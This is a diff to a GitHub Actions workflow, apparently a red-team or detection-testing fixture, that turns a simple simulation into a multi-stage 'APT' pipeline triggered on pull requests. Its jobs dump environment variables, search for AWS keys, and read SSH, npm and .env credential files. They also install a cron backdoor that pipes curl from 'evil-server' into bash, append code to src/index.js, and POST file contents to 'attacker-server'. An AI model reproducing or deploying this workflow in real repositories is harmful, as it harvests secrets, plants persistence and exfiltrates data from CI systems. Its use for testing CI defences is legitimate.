@@ -1,14 +1,56 @@
-name: 🐍 Malicious PR Simulation
+name: 🛑 Malicious PR APT Workflow
 
 on:
   pull_request:
     branches: [main]
 
 jobs:
-  steal-secrets:
+  recon:
     runs-on: ubuntu-latest
     steps:
-      - name: 📤 Exfiltrate Fake Secrets
+      - name: 🕵️ Initial Recon
         run: |
-          echo "exfiltrating secrets to http://attacker.tld"
-          echo "key=$AWS_SECRET_ACCESS_KEY"
+          echo "Enumerating environment variables..."
+          env
+          echo "Listing repository files..."
+          ls -la
+
+  creds:
+    runs-on: ubuntu-latest
+    needs: recon
+    steps:
+      - name: 🔑 Credential Harvesting
+        run: |
+          echo "Searching for AWS credentials..."
+          grep -r "AKIA" . || true
+          echo "Checking .npmrc/.env/.ssh if exists..."
+          ls -la ~/.ssh || true
+          cat ~/.npmrc || true
+          cat .env || true
+
+  backdoor:
+    runs-on: ubuntu-latest
+    needs: creds
+    steps:
+      - name: 🐚 Persistence & Backdoor
+        run: |
+          mkdir ~/.backdoor
+          echo "curl http://evil-server/implant.sh | bash" > ~/.backdoor/init.sh
+          echo "@reboot bash ~/.backdoor/init.sh" | crontab -
+
+  supplychain:
+    runs-on: ubuntu-latest
+    needs: backdoor
+    steps:
+      - name: ☣️ Inject Malicious Code (Simulated)
+        run: |
+          echo 'console.log("🔥 Malicious payload running!");' >> src/index.js
+
+  apt:
+    runs-on: ubuntu-latest
+    needs: supplychain
+    steps:
+      - name: 🛰️ APT Data Exfiltration
+        run: |
+          echo "Sending data to C2 server..."
+          curl -X POST -d @src/index.js http://attacker-server/data
